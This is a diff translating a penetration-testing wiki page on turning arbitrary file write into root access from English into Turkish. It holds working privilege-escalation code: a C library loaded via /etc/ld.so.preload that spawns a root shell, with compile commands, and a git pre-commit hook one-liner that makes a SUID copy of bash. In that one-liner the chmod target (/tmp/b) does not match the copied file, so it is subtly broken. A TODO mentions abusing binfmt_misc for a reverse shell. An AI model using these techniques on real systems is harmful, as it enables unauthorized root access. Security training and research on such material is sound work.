@@ -1,50 +1,46 @@
-# Arbitrary File Write to Root
+# Root'a Rastgele Dosya Yazma
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
-If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.
+Bu dosya **`LD_PRELOAD`** ortam değişkeni gibi davranır ama aynı zamanda **SUID ikili dosyalarında** da çalışır.\
+Eğer bunu oluşturabiliyorsanız veya değiştirebiliyorsanız, her çalıştırılan ikili dosya ile yüklenecek bir **kütüphane yolu ekleyebilirsiniz**.
 
-For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
-
+Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-    unlink("/etc/ld.so.preload");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+unlink("/etc/ld.so.preload");
+setgid(0);
+setuid(0);
+system("/bin/bash");
 }
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks), çeşitli **olaylar** sırasında bir git deposunda **çalıştırılan** **betiklerdir**; örneğin bir commit oluşturulduğunda, bir merge... Yani eğer bir **ayrılmış betik veya kullanıcı** bu işlemleri sıkça gerçekleştiriyorsa ve **`.git` klasörüne yazma** imkanı varsa, bu **privesc** için kullanılabilir.
 
-For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
-
+Örneğin, bir git deposunda **`.git/hooks`** içinde her yeni commit oluşturulduğunda her zaman çalıştırılacak bir **betik** **oluşturmak** mümkündür:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-
-### Cron & Time files
+### Cron & Time dosyaları
 
 TODO
 
-### Service & Socket files
+### Service & Socket dosyaları
 
 TODO
 
 ### binfmt_misc
 
-The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+`/proc/sys/fs/binfmt_misc` konumundaki dosya, hangi ikili dosyanın hangi tür dosyaları çalıştırması gerektiğini gösterir. TODO: yaygın bir dosya türü açıldığında bir rev shell çalıştırmak için bunu kötüye kullanma gereksinimlerini kontrol et. 
 
 {{#include ../../banners/hacktricks-training.md}}
